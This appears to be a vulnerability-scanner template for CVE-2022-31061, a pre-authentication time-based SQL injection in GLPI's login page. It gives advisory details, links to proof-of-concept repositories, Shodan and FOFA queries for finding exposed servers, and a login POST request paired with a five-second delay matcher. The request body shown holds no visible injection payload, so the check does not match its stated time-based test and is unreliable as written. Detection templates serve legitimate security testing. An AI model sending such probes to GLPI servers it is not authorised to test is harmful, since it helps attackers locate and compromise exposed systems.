id: CVE-2022-31061

info:
  name: GLPI Time-based SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    GLPI is a Free Asset and IT Management Software package, Data center management, ITIL Service Desk, licenses tracking and software auditing. In affected versions there is a SQL injection vulnerability which is possible on login page. No user credentials are required to exploit this vulnerability. Users are advised to upgrade as soon as possible. There are no known workarounds for this issue.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/glpi-project/glpi/security/advisories/GHSA-w2gc-v2gm-q7wq
    - https://github.com/SYRTI/POC_to_review
    - https://github.com/WhooAmii/POC_to_review
    - https://github.com/trhacknon/Pocingit
    - https://github.com/Feals-404/GLPIAnarchy
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-31061
    cwe-id: CWE-89
    epss-score: 0.0018
    epss-percentile: 0.56351
    cpe: cpe:2.3:a:glpi-project:glpi:*:*:*:*:*:*:*:*
  metadata:
    vendor: glpi-project
    product: glpi
    shodan-query: http.title:"GLPI"
    fofa-query:
      - body="setup glpi"
      - icon_hash="-1474875778"
      - title="glpi"
    google-query: intitle:"glpi"

http:
  - method: POST
    path:
      - "{{BaseURL}}/front/login.php"

    body: |
      _glpi_csrf_token={{randstr}}&fielda62f008c7f1837=admin&fieldb62f008c7f1838=admin&auth=ldap&fieldc62f008c7f1839=admin&submit=Post

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
